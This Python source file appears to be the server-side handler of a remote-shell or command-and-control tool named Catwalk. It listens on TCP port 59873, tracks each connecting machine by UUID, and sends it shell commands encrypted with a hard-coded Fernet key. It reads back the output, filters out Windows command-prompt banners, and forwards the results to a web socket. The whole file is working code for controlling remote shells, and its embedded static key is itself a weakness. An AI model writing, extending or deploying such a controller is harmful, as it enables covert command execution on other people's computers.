"""
same as tcp.py, but with fernet encryption/decryption
"""

import re
import socket
import threading
import time
from managers.__base__ import BaseManager
from uuid import uuid4
from core.printl import *
from cryptography.fernet import Fernet

connections = {}
wsock = None

key:bytes = b'9ysErJLYagIzKZY_LxwdDhidc0xgFpxAwEMnjlEe5Tk='
fernet = Fernet(key)

class FernetCrypt():
    def encrypt(bytes:bytes) -> bytes:
        return fernet.encrypt(bytes)
    
    def decrypt(bytes:bytes) -> str:
        return fernet.decrypt(bytes).decode('utf-8')

class CatwalkFernet(BaseManager):
    def startServer(websock) -> None:
        """Required."""
        global connections, sock, recievedData, wsock, mostRecentlyRanCommands

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(("0.0.0.0", 59873))
        sock.listen(5)

        wsock = websock
        recievedData = {}
        mostRecentlyRanCommands = []

        threading.Thread(target=CatwalkFernet.serverThread, daemon=True).start()

    def run(command:str, uuid:str, isAsync:bool) -> str:
        """Required."""
        global connections

        client = connections.get(uuid)

        if client == None:
            return "Client key \"{}\" is invalid.".format(uuid)
        
        recievedData[uuid] = []
        mostRecentlyRanCommands.append((command+'\n'))
        client["socket"].sendall(
            FernetCrypt.encrypt(
                (command+'\n').encode('ascii')
                )
            )

        if isAsync:
            return True
        
        time.sleep(0.15)

        prevLen = 0
        frames = 0
        while True:
            time.sleep(.01)

            if len(recievedData[uuid]) > prevLen:
                frames = 0
                prevLen = len(recievedData[uuid])

            if frames >= 50:
                if len(recievedData[uuid]) == 0:
                    frames = 0
                    continue
                
                break
        
            frames += 1

        response = recievedData[uuid]
        recievedData[uuid] = []

        warn("RESPONSE: {}".format(response))

        return '\n'.join(response)
        
    def listening() -> tuple:
        """Required."""

        return sock.getsockname()

    def generateID() -> str:
        """Required."""
        return str(uuid4())

    def getConnections() -> dict:
        """
        Required. Must be returned in a dictionary.
        "run" must be the function to run commands. In our case, it's `CatwalkFernet.run` 

        Example:
        
        ```py
        {
            "client_1": {
                "name": "main_system",
                "ip": "1.2.3.4",
                "sysinfo": {...},
                "run": <object at ...>
            },
            "client_2": {
                "name": "koch",
                "ip": "1.2.3.5",
                "sysinfo": {...},
                "run": <object at ...>
            },
        }
        ```
        """
        global connections

        return connections

    def serverThread():
        """Not required."""
        global connections, sock

        while True:
            info("[TCP] waiting for connection")
            cs, caddr = sock.accept()
            info("[TCP] connection from {}".format(caddr))

            clientInfo = {
                "ip": caddr[0],
                "socket": cs,
                "run": CatwalkFernet.run
            }

            uid = CatwalkFernet.generateID()
            connections[uid] = clientInfo
            threading.Thread(target=CatwalkFernet.readThread, args=(cs, uid)).start()

    def readThread(sock:socket.socket,uuid:str):
        """auto read data from sock"""
        global recievedData

        recievedData[uuid] = []
        
        while True:
            try:
                datastr = FernetCrypt.decrypt(sock.recv(16384))
                #datastr = data.decode('ascii')
            except:
                warn("[TCP] {} disconnected".format(uuid))
                sock.close()
                return
            
            wsock.emit('clientrx', {uuid: datastr}, namespace='/')

            # important stuff after this

            cleanANSI = re.compile(r'\x1b(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
            datalns = datastr.split('\n')

            blStrings = [
                "@", "C:\\", "$",
                "Microsoft Windows [Version ",
                "(c) Microsoft Corporation"
            ]
            for dataline in datalns:
                dataline = cleanANSI.sub('', dataline).strip()

                for x in blStrings:
                    if x in dataline and len(dataline) == 1:
                        dataline = ""

                if len(mostRecentlyRanCommands) != 0 and mostRecentlyRanCommands[-1].strip() == dataline.strip():
                    continue

                if len(dataline.strip()) == 0:
                    continue
                
                print("DL: {}".format(dataline))
                recievedData[uuid].append(dataline)
            